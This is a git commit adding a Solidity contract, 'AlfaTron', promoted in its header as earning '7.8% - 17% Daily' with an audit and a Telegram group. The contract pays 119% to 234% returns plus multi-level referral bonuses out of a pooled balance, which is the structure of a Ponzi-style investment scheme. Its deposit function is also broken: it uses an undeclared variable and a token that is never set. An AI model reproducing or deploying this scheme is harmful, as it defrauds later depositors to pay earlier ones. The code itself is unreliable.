4be14f8328fe42810c16af0fde5ba8ce2d7b2abf
bramirez <brian.ramirez@despegar.com>
2021-05-19 23:24:49 -0300

    Add new contract

---
+++ contracts/AlfaCake.sol
@@ -0,0 +1,287 @@
+/**
+    ALFATRON - Earn 7.8% - 17% Daily
+    Choose from 7 days to 30 days
+    Audited by HazeCrypto
+    Telegram group = @AlfaTronMain
+
+ */
+
+
+pragma solidity 0.5.10;
+
+interface BEP20 {
+  function balanceOf(address _owner) external view returns (uint256 balance);
+  function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
+  function allowance(address _owner, address _spender) external view returns (uint256 remaining);
+  function approve(address _spender, uint256 _value) external returns (bool success);
+
+  event Transfer(address indexed from, address indexed to, uint256 value);
+  event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+contract Token is BEP20 {
+    event Transfer(address indexed from, address indexed to, uint tokens);
+    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
+
+    mapping(address => uint256) balances;
+    mapping(address => mapping (address => uint256)) allowed;
+
+    using SafeMath for uint256;
+
+    constructor() public {}
+
+    function balanceOf(address tokenOwner) public view returns (uint256) {
+        return balances[tokenOwner];
+    }
+
+    function allowance(address owner, address delegate) public view returns (uint) {
+        return allowed[owner][delegate];
+    }
+
+    function approve(address delegate, uint256 numTokens) public returns (bool) {
+        allowed[msg.sender][delegate] = numTokens;
+
+        emit Approval(msg.sender, delegate, numTokens);
+
+        return true;
+    }
+
+
+    function transferFrom(address owner, address buyer, uint256 numTokens) public returns (bool) {
+        require(numTokens <= balances[owner]);
+        require(numTokens <= allowed[owner][msg.sender]);
+
+        balances[owner] = balances[owner].sub(numTokens);
+        allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);
+        balances[buyer] = balances[buyer].add(numTokens);
+
+        emit Transfer(owner, buyer, numTokens);
+
+        return true;
+    }
+}
+
+contract AlfaTron {
+    struct Tarif {
+        uint8 life_days;
+        uint8 percent;
+    }
+
+    struct Deposit {
+        uint8 tarif;
+        uint256 amount;
+        uint40 time;
+    }
+
+    struct Player {
+        address upline;
+        uint256 dividends;
+        uint256 direct_bonus;
+        uint256 match_bonus;
+        uint40 last_payout;
+        uint256 total_invested;
+        uint256 total_withdrawn;
+        uint256 total_match_bonus;
+        Deposit[] deposits;
+        mapping(uint8 => uint256) structure;
+    }
+
+    address payable public owner;
+
+    uint256 public invested;
+    uint256 public withdrawn;
+    uint256 public direct_bonus;
+    uint256 public match_bonus;
+    
+    uint8[] public ref_bonuses; // 1 => 1%
+
+    Tarif[] public tarifs;
+    mapping(address => Player) public players;
+
+    event Upline(address indexed addr, address indexed upline, uint256 bonus);
+    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
+    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
+    event Withdraw(address indexed addr, uint256 amount);
+
+    BEP20 public token;
+
+    constructor() public {
+        owner = msg.sender;
+
+        tarifs.push(Tarif(7, 119));
+        tarifs.push(Tarif(8, 124));
+        tarifs.push(Tarif(9, 129));
+        tarifs.push(Tarif(10, 134));
+        tarifs.push(Tarif(11, 139));
+        tarifs.push(Tarif(12, 144));
+        tarifs.push(Tarif(13, 149));
+        tarifs.push(Tarif(14, 154));
+        tarifs.push(Tarif(15, 159));
+        tarifs.push(Tarif(16, 164));
+        tarifs.push(Tarif(17, 169));
+        tarifs.push(Tarif(18, 174));
+        tarifs.push(Tarif(19, 179));
+        tarifs.push(Tarif(20, 184));
+        tarifs.push(Tarif(21, 189));
+        tarifs.push(Tarif(22, 194));
+        tarifs.push(Tarif(23, 199));
+        tarifs.push(Tarif(24, 204));
+        tarifs.push(Tarif(25, 209));
+        tarifs.push(Tarif(26, 214));
+        tarifs.push(Tarif(27, 219));
+        tarifs.push(Tarif(28, 224));
+        tarifs.push(Tarif(29, 229));
+        tarifs.push(Tarif(30, 234));
+
+        ref_bonuses.push(5);
+        ref_bonuses.push(3);
+        ref_bonuses.push(2);
+    }
+
+    function _payout(address _addr) private {
+        uint256 payout = this.payoutOf(_addr);
+
+        if(payout > 0) {
+            players[_addr].last_payout = uint40(block.timestamp);
+            players[_addr].dividends += payout;
+        }
+    }
+
+    function _refPayout(address _addr, uint256 _amount) private {
+        address up = players[_addr].upline;
+
+        for(uint8 i = 0; i < ref_bonuses.length; i++) {
+            if(up == address(0)) break;
+            
+            uint256 bonus = _amount * ref_bonuses[i] / 100;
+            
+            players[up].match_bonus += bonus;
+            players[up].total_match_bonus += bonus;
+
+            match_bonus += bonus;
+
+            emit MatchPayout(up, _addr, bonus);
+
+            up = players[up].upline;
+        }
+    }
+
+    function _setUpline(address _addr, address _upline, uint256 _amount) private {
+        if(players[_addr].upline == address(0) && _addr != owner) {
+            if(players[_upline].deposits.length == 0) {
+                _upline = owner;
+            }
+            else {
+                players[_addr].direct_bonus += _amount / 100;
+                direct_bonus += _amount / 100;
+            }
+
+            players[_addr].upline = _upline;
+
+            emit Upline(_addr, _upline, _amount / 100);
+            
+            for(uint8 i = 0; i < ref_bonuses.length; i++) {
+                players[_upline].structure[i]++;
+
+                _upline = players[_upline].upline;
+
+                if(_upline == address(0)) break;
+            }
+        }
+    }
+    
+    function deposit(uint8 _tarif, address _upline) external payable {
+        require(tarifs[_tarif].life_days > 0, "Tarif not found");
+        require(msg.value >= 5e7, "Zero amount");
+
+        Player storage player = players[msg.sender];
+
+        require(player.deposits.length < 100, "Max 100 deposits per address");
+
+        _setUpline(msg.sender, _upline, msg.value);
+
+        player.deposits.push(Deposit({
+            tarif: _tarif,
+            amount: msg.value,
+            time: uint40(block.timestamp)
+        }));
+
+        token.transferFrom(msg.sender, address(this), amount);
+
+        player.total_invested += msg.value;
+        invested += msg.value;
+
+        _refPayout(msg.sender, msg.value);
+        
+        emit NewDeposit(msg.sender, msg.value, _tarif);
+    }
+    
+    function withdraw() external {
+        Player storage player = players[msg.sender];
+
+        _payout(msg.sender);
+
+        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");
+
+        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;
+
+        player.dividends = 0;
+        player.direct_bonus = 0;
+        player.match_bonus = 0;
+        player.total_withdrawn += amount;
+        withdrawn += amount;
+
+        msg.sender.transfer(amount);
+        
+        emit Withdraw(msg.sender, amount);
+    }
+
+    function payoutOf(address _addr) view external returns(uint256 value) {
+        Player storage player = players[_addr];
+
+        for(uint256 i = 0; i < player.deposits.length; i++) {
+            Deposit storage dep = player.deposits[i];
+            Tarif storage tarif = tarifs[dep.tarif];
+
+            uint40 time_end = dep.time + tarif.life_days * 86400;
+            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
+            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);
+
+            if(from < to) {
+                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
+            }
+        }
+
+        return value;
+    }
+
+
+    /*
+        Only external call
+    */
+    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
+        Player storage player = players[_addr];
+
+        uint256 payout = this.payoutOf(_addr);
+
+        for(uint8 i = 0; i < ref_bonuses.length; i++) {
+            structure[i] = player.structure[i];
+        }
+
+        return (
+            payout + player.dividends + player.direct_bonus + player.match_bonus,
+            player.total_invested,
+            player.total_withdrawn,
+            player.total_match_bonus,
+            structure
+        );
+    }
+
+    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
+        return (invested, withdrawn, direct_bonus, match_bonus);
+    }
+
+    function allowanceAmount() public view returns (uint256) {
+        return token.allowance(msg.sender, address(this));
+    }
+}
